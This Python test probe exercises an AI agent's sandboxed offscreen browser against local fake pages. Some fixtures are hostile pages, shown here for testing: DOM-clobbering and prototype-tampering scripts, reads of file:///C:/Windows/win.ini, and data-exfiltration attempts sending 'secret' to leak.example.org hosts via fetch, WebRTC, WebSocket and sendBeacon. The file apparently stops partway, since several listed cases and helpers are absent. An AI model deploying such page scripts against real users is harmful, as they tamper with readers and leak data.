"""One case of the agent's browser (agent.browser), run in a process of its own by tests/test_agent_browser.py so
QtWebEngine never starts inside the shared unittest process.

    python.exe -B tests/agent_browser_probe.py <case>      prints one JSON line (the case's findings)

Cases: search, read, picture, crash, timeout, stop, quit, hooks, focus, linger, file, gate, gate_control, task. Qt runs
offscreen. LOCAL PAGES ONLY: no case loads a real page. On the offscreen platform the browser refuses every network
address and blocks every network request of a page, and Chromium runs with a proxy that is not there
(snapshots.OFFLINE_FLAGS). The gate cases run the PRODUCTION network settings instead, Chromium through the network
gate, whose resolver and connector are fakes: the one server anything can "reach" is a listener of this process, so
nothing leaves this PC there either, and they prove what reaches it. The real Claude Code is never started: the task
case's engine is tests.agent_fakes.FakeEngine, really POSTing to the real endpoint on loopback. Every value is invented;
files go only to temporary folders.
"""

from __future__ import annotations

import json
import os
import signal
import socket
import sys
import tempfile
import threading
import time
from collections.abc import Callable
from dataclasses import replace
from datetime import datetime, timezone
from pathlib import Path
from types import SimpleNamespace
from typing import Any

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

WHEN = datetime(2026, 11, 4, 18, 30, tzinfo=timezone.utc)
PAGE = "https://www.example.org/page"
MARK = "PROBE-WORDS-7f3a"
HANG = "<html><body style='background:#2a9d8f'><h1>stuck</h1><script>while(true){}</script></body></html>"
DDG_PAGE = """<!doctype html><title>laptops at DuckDuckGo</title><body>
<article><h2><a data-testid="result-title-a" href="https://www.example.org/ddg-one"><span>DDG first</span></a></h2>
<div data-result="snippet">The first   snippet.</div></article>
<article><h2><a data-testid="result-title-a" href="https://www.example.net/ddg-two">DDG second</a></h2></article>
<article><h2><a data-testid="result-title-a" href="https://localhost/ddg-local">Local result</a></h2></article>
<a href="https://www.example.org/not-a-result">Not a result</a></body>"""
BING_PAGE = """<!doctype html><title>laptops - Bing</title><body><ol id="b_results">
<li class="b_algo"><h2><a href="https://www.bing.com/ck/a?!&&p=abc&u=a1aHR0cHM6Ly93d3c">Bing first</a></h2>
<div class="b_caption"><p>Bing snippet.</p></div></li>
<li class="b_ad"><h2><a href="https://ads.example.org/ad">An ad</a></h2></li></ol></body>"""
GOOGLE_PAGE = """<!doctype html><title>laptops - Google Search</title><body><div id="search">
<div class="g" data-hveid="1"><a href="https://www.example.org/g-one"><br><h3>Google first</h3><cite>example</cite></a>
<div class="VwiC3b">Google snippet.</div></div></div>
<a href="https://www.example.org/nav"><h3>Outside the results</h3></a></body>"""
DRAWN_LATE = """<!doctype html><title>Late</title><body><div id=box>Loading</div><script>
setTimeout(function () { document.getElementById('box').innerHTML =
  '<article><h2><a data-testid="result-title-a" href="https://www.example.org/late">Drawn late</a></h2></article>'; }, 900);
</script></body>"""
EMPTY_PAGE = "<!doctype html><title>Nothing</title><body>No results found for your words.</body>"
CAPTCHA_PAGE = """<!doctype html><title>Sorry</title><body>Our systems have detected unusual traffic from your computer.
<form><input name=answer></form><a href="https://www.example.org/help">Help</a></body>"""
CONSENT_PAGE = "<!doctype html><title>Before you continue</title><body>Before you continue to the search, accept.</body>"
BLOCK_PAGE = "<!doctype html><title>Blocked</title><body>Access denied. You have been blocked.</body>"
# The page's scripts try everything a script can to see or change the reading. __calls counts each time one of their
# traps is walked into; <img name="body"> and the like shadow properties of document even in another world (DOM
# clobbering).
HOSTILE_READ = f"""<!doctype html><html><head><title>The real title</title></head><body>
<h1>{MARK} on the page</h1>
<img name="body"><img name="links"><img name="title"><form name="querySelectorAll"></form><img name="scrollingElement">
<a href="https://www.example.org/first">First link</a> <a href="https://www.example.org/second?x=1#y">Second link</a>
<a href="https://www.example.org/first">First link again</a>
<a href="https://www.example.org/hidden" style="display:none">Hidden link</a>
<a href="https://localhost/here">A local link</a> <a href="http://www.example.org/plain">A plain http link</a>
<a href="/relative">Relative to nowhere public</a> <a href="https://www.example.org/icon"><img alt=""></a>
<a href="https://www.example.org/labelled" aria-label="Labelled link"><span></span></a>
<div style="display:none">HIDDEN-WORDS</div>
<script>
window.__calls = 0;
function trap(where, name, value) {{
  Object.defineProperty(where, name, {{configurable: true, get: function () {{ window.__calls++; return value; }}}});
}}
var realStringify = JSON.stringify;
JSON.stringify = function () {{ window.__calls++; return '{{"title":"HACKED","text":"HACKED","links":[]}}'; }};
var realDescriptor = Object.getOwnPropertyDescriptor;
Object.getOwnPropertyDescriptor = function () {{ window.__calls++; return realDescriptor.apply(this, arguments); }};
Document.prototype.querySelectorAll = function () {{ window.__calls++; return []; }};
Element.prototype.querySelectorAll = function () {{ window.__calls++; return []; }};
Element.prototype.getClientRects = function () {{ window.__calls++; return []; }};
String.prototype.slice = function () {{ window.__calls++; return 'HACKED'; }};
Array.prototype.push = function () {{ window.__calls++; return 0; }};
trap(HTMLElement.prototype, 'innerText', 'HACKED');
trap(Document.prototype, 'title', 'HACKED TITLE');
trap(Document.prototype, 'links', []);
trap(Document.prototype, 'body', null);
</script></body></html>"""
HOOKS_PAGE = """<!doctype html><html><body><pre id=out></pre><a id=dl1></a><a id=dl2></a>
<form id=post method=POST action="https://www.example.org/post"><input name=q value=x></form>
<input type=file id=picker>
<script>
var out = document.getElementById('out');
function say(name, value) { out.textContent += name + '=' + value + '\\n'; }
say('script', 'ran');
try { say('open', window.open('https://www.example.org/popup') === null ? 'null' : 'window'); } catch (e) { say('open', 'threw'); }
try { Notification.requestPermission().then(function (p) { say('notify', p); }, function () { say('notify', 'threw'); }); }
catch (e) { say('notify', 'threw'); }
try { navigator.geolocation.getCurrentPosition(function () { say('geo', 'GRANTED'); }, function (e) { say('geo', e.code); }); }
catch (e) { say('geo', 'threw'); }
try { alert('probe'); say('confirm', confirm('probe')); say('prompt', prompt('probe', 'x')); } catch (e) { say('dialogs', 'threw'); }
try { navigator.clipboard.readText().then(function () { say('clip', 'READ'); }, function () { say('clip', 'refused'); }); }
catch (e) { say('clip', 'threw'); }
try { document.getElementById('picker').click(); say('picker', 'clicked'); } catch (e) { say('picker', 'threw'); }
try { var a = document.getElementById('dl1'); a.href = 'data:text/plain,probe'; a.download = 'agent-probe.txt'; a.click(); } catch (e) {}
try { var b = document.getElementById('dl2'); b.download = 'agent-probe-blob.bin';
      b.href = URL.createObjectURL(new Blob(['probe'], {type: 'application/octet-stream'})); b.click(); } catch (e) {}
try { var f = document.createElement('iframe'); f.src = 'data:application/octet-stream,probe'; document.body.appendChild(f); } catch (e) {}
</script></body></html>"""
POST_PAGE = """<!doctype html><html><body><pre id=out>before</pre>
<form id=post method=POST action="https://www.example.org/post"><input name=q value=x></form><script>
setTimeout(function () {
  try { document.getElementById('post').submit(); document.getElementById('out').textContent = 'post tried'; }
  catch (e) { document.getElementById('out').textContent = 'post threw'; }
}, 100);
</script></body></html>"""
CLOSING_PAGE = """<!doctype html><html><body><pre id=out>before</pre><script>
setTimeout(function () { window.close(); document.getElementById('out').textContent = 'closing tried'; }, 900);
</script></body></html>"""
FOCUS_PAGE = """<!doctype html><html><body style="margin:0;height:900px"><input autofocus id=box>
<div contenteditable id=edit>edit me</div><script>
function grab() { document.getElementById('box').focus(); window.focus(); document.getElementById('edit').focus(); }
grab(); setInterval(grab, 30);
function mark(name) { document.addEventListener(name, function () { document.documentElement.dataset[name] = 'yes'; }, true); }
mark('mousedown'); mark('keydown'); mark('wheel');
try { window.moveTo(0, 0); window.resizeTo(10, 10); } catch (e) {}
try { document.documentElement.requestFullscreen().catch(function () {}); } catch (e) {}
</script></body></html>"""
NOISE_PAGE = """<!doctype html><html><body style="margin:0"><canvas id=c width=2400 height=1400></canvas><script>
var c = document.getElementById('c').getContext('2d'); var seed = 7;
function next() { seed = (seed * 1664525 + 1013904223) % 4294967296; return seed; }
for (var y = 0; y < 1400; y += 3) { for (var x = 0; x < 2400; x += 3) { var v = next();
  c.fillStyle = 'rgb(' + (v & 255) + ',' + ((v >> 8) & 255) + ',' + ((v >> 16) & 255) + ')'; c.fillRect(x, y, 3, 3); } }
</script></body></html>"""
WORK_PAGE = f"""<!doctype html><html><head><title>My report</title></head><body><h1>{MARK}</h1><div id=out>start</div>
<img id=own src="pic.svg">
<script>
var out = document.getElementById('out'); function say(w) {{ out.textContent += ' ' + w; }}
function image(name, address) {{ var i = new Image();
  i.onload = function () {{ say(name + ':LOADED'); }}; i.onerror = function () {{ say(name + ':refused'); }}; i.src = address; }}
say('script-ran');
image('own', 'pic.svg'); image('deep', 'notes/deep.svg');
image('remote', 'https://www.example.org/leak.png?d=secret');
image('parent', '../pic.svg'); image('other', '../othertoken/pic.svg'); image('file', 'file:///C:/Windows/win.ini');
fetch('https://www.example.org/fetch?d=secret').then(function () {{ say('fetch:LOADED'); }}, function () {{ say('fetch:refused'); }});
</script></body></html>"""
PIC_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40" fill="#e63946"/></svg>'
LEAKY_PAGE = """<!doctype html><html><head><title>Mine</title>
<link rel=preconnect href="https://preconnect.leak.example.org">
<link rel=dns-prefetch href="https://dns.leak.example.org">
<link rel=stylesheet href="https://css.leak.example.org/x.css">
</head><body>
<h1>The page the agent wrote</h1><div id=out>start</div>
<img src="https://img.leak.example.org/leak.png?d=secret">
<iframe src="https://frame.leak.example.org/"></iframe>
<script>
var out = document.getElementById('out'); function say(w) { out.textContent += ' ' + w; }
say('script-ran');
fetch('https://fetch.leak.example.org/x?d=secret').then(function () { say('fetch:LOADED'); }, function () { say('fetch:refused'); });
try { var pc = new RTCPeerConnection({iceServers: [{urls: 'turn:turn.leak.example.org:443?transport=tcp',
                                                    username: 'secret', credential: 'x'}]});
  say('rtc-made'); pc.createDataChannel('x');
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
} catch (e) { say('rtc-threw'); }
try { new WebSocket('wss://ws.leak.example.org/secret'); say('ws-made'); } catch (e) { say('ws-threw'); }
try { navigator.sendBeacon('https://beacon.leak.example.org/x', 'secret'); say('beacon-sent'); } catch (e) { say('beacon-threw'); }
try { var wt = new WebTransport('https://wt.leak.example.org/'); wt.ready.catch(function () {}); wt.closed.catch(function () {}); }
catch (e) { say('wt-threw'); }
var more = document.createElement('link'); more.rel = 'preconnect'; more.href = 'https://dynamic.leak.example.org';
document.head.appendChild(more);
setTimeout(function () { location.href = 'https://nav.leak.example.org/?d=secret'; }, 1000);
</script></body></html>"""
WEB_CONTROL_PAGE = """<!doctype html><title>A web page</title><body>A web page.<script>
fetch('https://after.example.org/x').catch(function () {});
</script></body>"""


def long_page(lines: int = 2200) -> str:
    rows = "".join(f"<p>Line number {number} of a long page.</p>" for number in range(lines))
    return f"<!doctype html><title>Long</title><body>{rows}</body>"


def children(name: str = "QtWebEngineProcess.exe") -> list[int]:
    from tests.snapshot_probe import children as found

    return found(name)


class _RefusingSite:
    """Stands where the network gate would (Chromium's proxy) and answers as a site would: the status its path names.
    Only ever on loopback. ``hits``: each path asked for; ``agents``: the User-Agent each request came with;
    ``connects``: tunnels asked for (none is made)."""

    BODIES = {"403": (403, b"<html><body>Access denied</body></html>"), "403empty": (403, b""),
              "401": (401, b"<html><body>Sign in</body></html>"), "429": (429, b"<html><body>Slow down</body></html>"),
              "404": (404, b"<html><body>Not here</body></html>"),
              "200": (200, b"<html><title>Fine</title><body style='background:#fff'><h1>A page</h1></body></html>")}

    def __init__(self) -> None:
        self.hits: list[str] = []
        self.agents: list[str] = []
        self.connects = 0
        self._server = socket.socket()
        self._server.bind(("127.0.0.1", 0))
        self._server.listen(16)
        self._server.settimeout(0.2)
        self._stop = False

    def start(self) -> int:
        threading.Thread(target=self._serve, daemon=True).start()
        return self._server.getsockname()[1]

    def seal(self, _sealed: bool) -> None:
        pass

    def counts(self) -> dict[str, int]:
        return {"hits": len(self.hits)}

    def stop(self) -> None:
        self._stop = True

    def _serve(self) -> None:
        while not self._stop:
            try:
                connection, _address = self._server.accept()
            except OSError:
                continue
            threading.Thread(target=self._answer, args=(connection,), daemon=True).start()

    def _answer(self, connection: socket.socket) -> None:
        with connection:
            connection.settimeout(5)
            raw = b""
            try:
                while b"\r\n\r\n" not in raw:
                    piece = connection.recv(4096)
                    if not piece:
                        return
                    raw += piece
                lines = raw.decode("latin-1").split("\r\n")
                method, target, _version = lines[0].split(" ", 2)
                if method == "CONNECT":
                    self.connects += 1
                    connection.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
                    return
                path = target.rsplit("/", 1)[-1]
                self.hits.append(path)
                self.agents += [line.split(":", 1)[1].strip() for line in lines if line.lower().startswith("user-agent:")]
                status, body = self.BODIES.get(path, (404, b""))
                connection.sendall(f"HTTP/1.1 {status} Status\r\nContent-Type: text/html\r\nContent-Length: {len(body)}\r\n"
                                   "Connection: close\r\n\r\n".encode("ascii") + body)
            except OSError:
                pass


def _default_agent(snapshot_engine: Any) -> str:
    """The user agent of a profile nobody touched: the engine's own."""
    profile = snapshot_engine._classes().QWebEngineProfile()
    try:
        return profile.httpUserAgent()
    finally:
        profile.deleteLater()


def main(case: str) -> dict[str, Any]:
    from briefing_reader import snapshot_engine, snapshot_gate, snapshots

    if case not in ("gate", "gate_control", "refused"):
        os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = " ".join(snapshots.OFFLINE_FLAGS)
    else:
        os.environ.pop("QTWEBENGINE_CHROMIUM_FLAGS", None)
    snapshot_engine.prepare_application()
    from briefing_reader.agent import browser as agent_browser

    registered = agent_browser.register_scheme()
    from PySide6.QtCore import QEventLoop, Qt, QTimer, QUrl, qInstallMessageHandler
    from PySide6.QtWidgets import QApplication, QLineEdit, QWidget

    app = QApplication([sys.argv[0], "-platform", "offscreen"])
    app.setQuitOnLastWindowClosed(False)
    messages: list[str] = []
    qInstallMessageHandler(lambda _mode, _context, text: messages.append(str(text)))

    import tests  # noqa: F401 - the desktop test guard
    from briefing_reader import hud
    from briefing_reader.agent import policy, tools, web
    from briefing_reader.agent.firewall import WebFirewall
    from briefing_reader.agent.tools import Registry, RunContext
    from briefing_reader.agent.workspace import TaskFolder

    hud.load_fonts(PROJECT_ROOT / "fonts")

    def pump(seconds: float) -> None:
        wait_until(lambda: False, seconds)

    def wait_until(predicate: Callable[[], Any], timeout_s: float) -> bool:
        end = time.monotonic() + timeout_s
        while time.monotonic() < end:
            if predicate():
                return True
            loop = QEventLoop()
            QTimer.singleShot(15, loop.quit)
            loop.exec()
        return bool(predicate())

    def in_thread(work: Callable[[], Any], timeout_s: float = 60.0) -> tuple[Any, float]:
        """``work`` on a thread of its own, as a tool runs on the endpoint's; this thread is the GUI thread and
        pumps."""
        box: dict[str, Any] = {}

        def run() -> None:
            started = time.monotonic()
            try:
                box["value"] = work()
            except Exception as exc:  # noqa: BLE001 - the case looks at it
                box["value"] = exc
            box["took"] = time.monotonic() - started

        threading.Thread(target=run, daemon=True).start()
        wait_until(lambda: "took" in box, timeout_s)
        return box.get("value"), round(box.get("took", -1.0), 2)

    pages: dict[str, Any] = {}
    asked: list[str] = []

    def html_for(url: str) -> Any:
        asked.append(url)
        return pages.get(url)

    tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
    root = Path(tmp.name)
    folder = TaskFolder.create(root / "ws", "one task", WHEN)
    registry = Registry(policy.offered())
    state = {"cancelled": False}

    def make(engine: str = "duckduckgo", **options: Any) -> tuple[Any, Any, Any]:
        options.setdefault("html_for", html_for)
        client = agent_browser.BrowserClient(app, poll_s=0.01, **options)
        session = web.WebSession(client, engine)
        context = RunContext(run_id="r1", folder=folder, web=session, tool_s=40.0, cancelled=lambda: state["cancelled"])
        return client, session, context

    def tool(context: Any, name: str, /, **args: Any) -> Any:
        return registry.call(name, args, context)

    def script_in(client: Any, source: str) -> Any:
        value, _took = in_thread(lambda: client.script(source, timeout_s=10, cancelled=lambda: False))
        return value

    def main_world(client: Any, source: str) -> Any:
        """``source`` in the page's OWN world, on the GUI thread: what its scripts themselves can see."""
        box: dict[str, Any] = {}
        client.browser()._shot.page.runJavaScript(source, 0, lambda value: box.setdefault("value", value))
        wait_until(lambda: "value" in box, 10)
        return box.get("value")

    def describe(result: Any) -> dict[str, Any]:
        return {"text": result.text, "code": result.code, "is_error": result.is_error, "note": result.note,
                "fields": [list(item) for item in result.fields], "warn": result.warn,
                "pictures": len(result.pictures), "live": result.live_picture is not None}

    report: dict[str, Any] = {"case": case, "platform": app.platformName(), "registered": registered}
    if case == "search":
        results: dict[str, Any] = {}

        def search(name: str, engine: str, table: dict[str, str]) -> None:
            pages.clear()
            asked.clear()
            client, _session, context = make(engine)
            pages.update({web.ENGINES[[e.key for e in web.ENGINES].index(key)].url("laptops"): html
                          for key, html in table.items()})
            value, took = in_thread(lambda: tool(context, "web_search", query="laptops"))
            results[name] = {**describe(value), "asked": [url.split("/")[2] for url in asked], "took": took}
            client.shutdown()
            pump(0.2)

        search("duckduckgo", "duckduckgo", {"duckduckgo": DDG_PAGE})
        search("bing", "bing", {"bing": BING_PAGE})
        search("google", "google", {"google": GOOGLE_PAGE})
        search("late", "duckduckgo", {"duckduckgo": DRAWN_LATE})
        search("chain", "duckduckgo", {"duckduckgo": EMPTY_PAGE, "bing": CAPTCHA_PAGE, "google": GOOGLE_PAGE})
        search("walls", "duckduckgo", {"duckduckgo": CAPTCHA_PAGE, "bing": CONSENT_PAGE, "google": BLOCK_PAGE})
        report["results"] = results
    elif case == "read":
        pages[PAGE] = HOSTILE_READ
        pages["https://www.example.org/long"] = long_page()
        pages["https://www.example.org/moved"] = (long_page(5), "https://www.example.net/ended-here")
        client, session, context = make()
        opened, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        report["opened"] = describe(opened)
        report["calls_seen_by_the_page"] = main_world(client, "window.__calls")
        report["numbers"] = [session.book.address(number) for number in range(1, 8)]
        again, _took = in_thread(lambda: tool(context, "open_page", number=1))
        report["number_one_not_a_page"] = again.code
        first, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/long"))
        report["long_first"] = describe(first)
        report["top_before"] = script_in(client, "window.scrollY")
        more, _took = in_thread(lambda: tool(context, "read_more"))
        report["long_more"] = describe(more)
        report["top_after_one"] = script_in(client, "window.scrollY")
        parts = [more]
        while "call read_more" in parts[-1].text and len(parts) < 20:
            parts.append(in_thread(lambda: tool(context, "read_more"))[0])
        report["parts"] = len(parts) + 1
        report["top_at_the_end"] = script_in(client, "window.scrollY")
        report["height"] = script_in(client, "document.documentElement.scrollHeight")
        report["inner"] = script_in(client, "window.innerHeight")
        last, _took = in_thread(lambda: tool(context, "read_more"))
        report["after_the_end"] = last.text
        moved, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/moved"))
        report["moved"] = describe(moved)
        report["final_seen"] = session.book.seen("https://www.example.net/ended-here")
        client.shutdown()
    elif case == "picture":
        pages[PAGE] = NOISE_PAGE
        client, _session, context = make()
        value, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        report["opened"] = value.code
        window = client.browser().window()
        window.setGeometry(0, 0, 1900, 1000)
        pump(1.0)
        import base64

        looked, _took = in_thread(lambda: tool(context, "look_at_page"))
        body = base64.b64decode(looked.pictures[0][0])
        report.update(kind=looked.pictures[0][1], jpeg=body[:2] == b"\xff\xd8", bytes=len(body), note=looked.note,
                      view_width=client.browser()._view.width(), live=looked.live_picture is not None)
        wide, _took = in_thread(lambda: client.picture(1280, 5_000_000, timeout_s=10, cancelled=lambda: False))
        report["wide"] = [wide.ok, wide.width, wide.height, len(wide.image)]
        small, _took = in_thread(lambda: client.picture(1280, 60_000, timeout_s=10, cancelled=lambda: False))
        report["small"] = [small.ok, small.width, len(small.image)]
        none, _took = in_thread(lambda: client.picture(1280, 500, timeout_s=10, cancelled=lambda: False))
        report["none"] = [none.ok, snapshots.reason_kind(none.reason)]
        refused, _took = in_thread(lambda: session_look(context))
        report["look_too_big"] = refused
        client.shutdown()
    elif case == "crash":
        pages[PAGE] = "<!doctype html><title>Fine</title><body>Fine words.</body>"
        pages["https://www.example.org/stuck"] = HANG
        client, _session, context = make()
        in_thread(lambda: tool(context, "open_page", url=PAGE))
        browser = client.browser()
        os.kill(browser._shot.page.renderProcessPid(), signal.SIGTERM)
        wait_until(lambda: not browser.has_page(), 15)
        report["page_after_idle_crash"] = browser.has_page()
        more, took = in_thread(lambda: tool(context, "read_more"))
        report["read_more"] = [more.code, more.is_error, more.text, took]
        look, took = in_thread(lambda: tool(context, "look_at_page"))
        report["look"] = [look.code, look.text, took]
        box: dict[str, Any] = {}

        def stuck() -> None:
            box["result"] = tool(context, "open_page", url="https://www.example.org/stuck")

        thread = threading.Thread(target=stuck, daemon=True)
        thread.start()
        wait_until(lambda: browser.has_page() and browser._shot.opened and browser._shot.page.renderProcessPid() > 0, 40)
        pump(0.3)
        started = time.monotonic()
        os.kill(browser._shot.page.renderProcessPid(), signal.SIGTERM)
        wait_until(lambda: "result" in box, 20)
        report["during_load"] = [box["result"].code, box["result"].text, round(time.monotonic() - started, 2)]
        again, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        report["next_page_opens"] = [again.is_error, "Fine words." in again.text]
        client.shutdown()
    elif case == "timeout":
        pages[PAGE] = HANG
        client, _session, context = make()
        started = time.monotonic()
        loaded, _took = in_thread(lambda: client.load(PAGE, timeout_s=2.0, cancelled=lambda: False))
        report["load"] = [loaded.ok, snapshots.reason_kind(loaded.reason), loaded.still_loading,
                          round(time.monotonic() - started, 2)]
        short = replace(context, tool_s=9.0)
        value, took = in_thread(lambda: tool(short, "open_page", url=PAGE))
        report["tool"] = [value.code, value.is_error, value.text, took]
        report["children_while_open"] = len(children())
        # A page still on its way to another (a redirect by script) is not ready yet: it is read when it has arrived.
        pages["https://www.example.org/moving"] = long_page(5)
        page_class = snapshot_engine._classes().Page
        moving = {"loading": True}
        page_class.isLoading = lambda _self: moving["loading"]
        QTimer.singleShot(1800, lambda: moving.update(loading=False))
        arrived, took = in_thread(lambda: client.load("https://www.example.org/moving", timeout_s=15, cancelled=lambda: False))
        del page_class.isLoading
        report["waited_for_the_redirect"] = [arrived.ok, arrived.still_loading, took]
        client.shutdown()
        report["children_after"] = 0 if wait_until(lambda: not children(), 10) else len(children())
    elif case == "stop":
        pages[PAGE] = HANG
        client, _session, context = make()
        box: dict[str, Any] = {}

        def stuck() -> None:
            started = time.monotonic()
            box["result"] = tool(context, "open_page", url=PAGE)
            box["took"] = time.monotonic() - started

        threading.Thread(target=stuck, daemon=True).start()
        report["ready"] = wait_until(lambda: client.browser() is not None and client.browser().has_page()
                                     and client.browser().window() is not None
                                     and client.browser().window().isVisible() and client.browser()._shot.opened, 40)
        pump(0.5)
        report["still_waiting"] = "result" not in box
        stopped = time.monotonic()
        client.stop()
        report["page_right_after"] = client.browser().has_page()
        report["window_right_after"] = client.browser().window() is not None
        wait_until(lambda: "result" in box, 3)
        report["released_in"] = round(time.monotonic() - stopped, 3)
        report["result"] = [box["result"].code, box["result"].text]
        report["children_after"] = 0 if wait_until(lambda: not children(), 10) else len(children())
        late = client.load(PAGE, timeout_s=5, cancelled=lambda: False)
        report["after_the_stop"] = snapshots.reason_kind(late.reason)
        pump(0.3)
        report["cancelled"] = cancelled_load(make, pages, wait_until, state, tool, pump)
    elif case == "quit":
        pages[PAGE] = long_page(50)
        pages["https://www.example.org/stuck"] = HANG
        client, _session, context = make()
        in_thread(lambda: tool(context, "open_page", url=PAGE))
        threading.Thread(target=lambda: tool(context, "open_page", url="https://www.example.org/stuck"), daemon=True).start()
        wait_until(lambda: client.browser()._request is not None and client.browser().has_page()
                   and client.browser()._shot.opened and not client.browser()._request.delivered, 40)
        pump(0.3)
        report["before"] = {"children": len(children()), "windows": _shown(app)}
        # At the top level, no event loop running: Jarvis closing (AppController.shutdown runs after app.exec()
        # returned).
        client.shutdown()
        report["windows_right_after"] = _shown(app)
        report["browser_page"] = client.browser() is not None
        report["views"] = sum(type(widget).__name__ == "QWebEngineView" for widget in QApplication.allWidgets())
        report["children_after"] = 0 if wait_until(lambda: not children(), 10) else len(children())
        report["profile_warning"] = any("still not deleted" in text for text in messages)
        # A page the agent wrote, then Jarvis closing: the sealed gate lets go too, with no event loop.
        folder.write("mine.html", "<title>Mine</title><body>Mine.</body>")
        second, _session2, context2 = make()
        in_thread(lambda: tool(context2, "show_file", name="mine.html"))
        report["held_with_a_file_open"] = agent_browser.gate_held()
        second.shutdown()
        report["held_after_quit"] = agent_browser.gate_held()
    elif case == "hooks":
        from tests.snapshot_probe import DownloadsWatcher
        from PySide6.QtCore import QStandardPaths

        watcher = DownloadsWatcher(QStandardPaths.writableLocation(QStandardPaths.StandardLocation.DownloadLocation))
        watcher.start()
        pages[PAGE] = HOOKS_PAGE
        client, _session, context = make()
        tops_before = len(QApplication.topLevelWidgets())
        value, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        pump(2.5)
        reread, _took = in_thread(lambda: client.script(web.read_script(), timeout_s=10, cancelled=lambda: False))
        read = web.read_page(reread)
        browser = client.browser()
        report.update(opened=value.code, text=read.text if read is not None else "", hooks=browser.hook_counts(),
                      new_top_levels=sorted(type(widget).__name__ for widget in QApplication.topLevelWidgets()
                                            if widget.isVisible()), tops_before=tops_before)
        pages["https://www.example.org/post"] = "<!doctype html><title>Posted</title><body>POSTED</body>"
        pages["https://www.example.org/form"] = POST_PAGE
        form, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/form"))
        pump(0.8)
        report["form"] = [form.code, web.read_page(script_in(client, web.read_script())).text, asked.count(
            "https://www.example.org/post"), browser.hook_counts()]
        pages["https://www.example.org/closing"] = CLOSING_PAGE
        closing, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/closing"))
        pump(1.2)
        report["closing"] = [closing.code, browser.window() is not None and browser.window().isVisible(),
                             bool(in_thread(lambda: tool(context, "look_at_page"))[0].pictures)]
        pump(0.5)
        report.update(watcher.finish())
        report["download_folder_entries"] = sorted(os.listdir(snapshot_engine.download_folder()))
        client.shutdown()
    elif case == "focus":
        pages[PAGE] = FOCUS_PAGE
        other = QLineEdit()
        other.show()
        other.activateWindow()
        other.setFocus()
        pump(0.3)
        client, _session, context = make()
        asked_for: list[str] = []
        from briefing_reader.agent.browser import WatchWindow

        for name in ("activateWindow", "raise_", "setFocus"):
            setattr(WatchWindow, name, lambda self, *args, n=name: asked_for.append(n))
        value, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        pump(1.5)                              # the page keeps asking for the focus all this while
        browser = client.browser()
        window = browser.window()
        view = browser._view
        handle = window.windowHandle()
        flag = Qt.WindowType
        focus = QApplication.focusWidget()
        report.update(
            opened=value.code, asked=asked_for, window_type=window.windowType().name,
            frameless=bool(window.windowFlags() & flag.FramelessWindowHint),
            on_top=bool(window.windowFlags() & flag.WindowStaysOnTopHint),
            no_focus_flag=bool(window.windowFlags() & flag.WindowDoesNotAcceptFocus),
            native_no_focus=bool(handle.flags() & flag.WindowDoesNotAcceptFocus),
            show_without_activating=window.testAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating),
            q_show=handle.property("_q_showWithoutActivating"), parent=window.parent() is None,
            window_policy=window.focusPolicy().name, view_policy=view.focusPolicy().name, view_enabled=view.isEnabled(),
            inner=sorted({child.focusPolicy().name for child in window.findChildren(QWidget)}),
            inner_enabled=sorted({child.isEnabled() for child in view.findChildren(QWidget)}),
            mouse=view.testAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents),
            focus_is_other=focus is other, focus_in_window=focus is not None and window.isAncestorOf(focus),
            hooks=browser.hook_counts(), visible=window.isVisible(), strip=list(window.strip_texts()),
            page_has_focus_inside=script_in(client, "document.activeElement && document.activeElement.id"))
        from PySide6.QtCore import QPoint
        from PySide6.QtTest import QTest

        def touch() -> dict[str, Any]:
            spot = QPoint(window.width() // 2, window.height() // 2)
            QTest.mouseClick(handle, Qt.MouseButton.LeftButton, Qt.KeyboardModifier.NoModifier, spot)
            QTest.keyClick(handle, Qt.Key.Key_A)
            pump(0.4)
            answer = script_in(client, "JSON.stringify(document.documentElement.dataset)")
            return json.loads(answer) if isinstance(answer, str) else {}

        report["input_reaches_the_page"] = touch()
        report["focus_after_input_in_window"] = (QApplication.focusWidget() is not None
                                                 and window.isAncestorOf(QApplication.focusWidget()))
        # The control: with the view open to input, the same click does reach the page, so the empty answer above means
        # something.
        view.setEnabled(True)
        view.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents, False)
        for child in view.findChildren(QWidget):
            child.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents, False)
        pump(0.2)
        report["control_input_reaches_the_page"] = touch()
        client.shutdown()
    elif case == "linger":
        pages[PAGE] = long_page(30)
        pages["https://www.example.org/two"] = long_page(10)
        pages["https://www.example.net/three"] = long_page(10)
        client, _session, context = make(linger_s=1.0)
        in_thread(lambda: tool(context, "open_page", url=PAGE))
        in_thread(lambda: tool(context, "open_page", url="https://www.example.org/two"))
        in_thread(lambda: tool(context, "open_page", url="https://www.example.net/three"))
        browser = client.browser()
        window = browser.window()
        report["strip"] = list(window.strip_texts())
        report["cut"] = window.cut_texts()
        report["pages_on_view"] = 1 if browser.has_page() else 0
        client.end_run(linger=True)
        report["after_end"] = {"page": browser.has_page(), "visible": window.isVisible(), "covered": window.covered(),
                               "strip": list(window.strip_texts())}
        report["children_soon"] = 0 if wait_until(lambda: not children(), 0.9) else len(children())
        report["still_there"] = browser.window() is not None
        wait_until(lambda: browser.window() is None, 5)
        report["gone"] = browser.window() is None
        report["top_levels"] = _shown(app)
        second, _session2, context2 = make(linger_s=30.0)
        in_thread(lambda: tool(context2, "open_page", url=PAGE))
        second.end_run(linger=True)
        report["lingering"] = _shown(app)
        second.close_now()
        pump(0.2)
        report["after_close_now"] = _shown(app)
